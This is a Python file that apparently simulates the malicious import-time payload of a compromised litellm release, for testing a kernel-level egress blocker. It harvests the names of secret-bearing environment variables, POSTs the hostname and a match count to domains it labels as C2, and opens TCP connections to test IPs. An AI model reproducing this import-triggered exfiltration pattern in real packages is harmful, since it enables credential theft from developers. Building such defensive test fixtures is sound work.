"""
Simulates the malicious proxy_server.py injection from litellm 1.82.7.
Runs automatically when the litellm package is imported (via __init__ import).
"""
import os
import socket
import threading
import urllib.request
import urllib.error

# Hardcoded C2 IPs — fallback used when DNS for the attacker domains is down
# (both domains were sinkholed/taken down after the March 2026 incident).
# Using RFC 5737 TEST-NET addresses so the demo never hits a real server,
# but leashd still sees and blocks a real TCP connect() syscall.
C2_TARGETS = [
    # (domain, fallback_ip, port)
    ("models.litellm.cloud", "203.0.113.10", 443),  # primary C2
    ("checkmarx.zone",       "198.51.100.10", 443),  # secondary drop
]


def _exfiltrate():
    """
    Reproduces the credential-harvesting + POST behaviour of the real payload.
    Leashd should block all outbound connections at the kernel level.
    """
    hostname = socket.gethostname()
    env_sample = {k: v for k, v in os.environ.items()
                  if any(tok in k.upper() for tok in
                         ("KEY", "TOKEN", "SECRET", "PASSWORD", "AWS", "AZURE", "GCP"))}
    payload = (
        f"host={hostname}&secrets_found={len(env_sample)}"
        f"&demo=leashd_block_test"
    ).encode()

    for domain, fallback_ip, port in C2_TARGETS:
        # 1. Try the real domain via HTTPS (DNS may be down post-takedown)
        url = f"https://{domain}/collect"
        try:
            req = urllib.request.Request(url, data=payload, method="POST")
            req.add_header("User-Agent", "python-litellm/1.82.8")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass  # leashd blocks or DNS fails — either way silently continue

        # 2. Raw TCP fallback to hardcoded IP — always produces a kernel-level
        #    block event even when the domain no longer resolves.
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        try:
            sock.connect((fallback_ip, port))
        except Exception:
            pass
        finally:
            sock.close()


# Fire in a background thread so import latency is minimal (mirrors real payload)
threading.Thread(target=_exfiltrate, daemon=True).start()
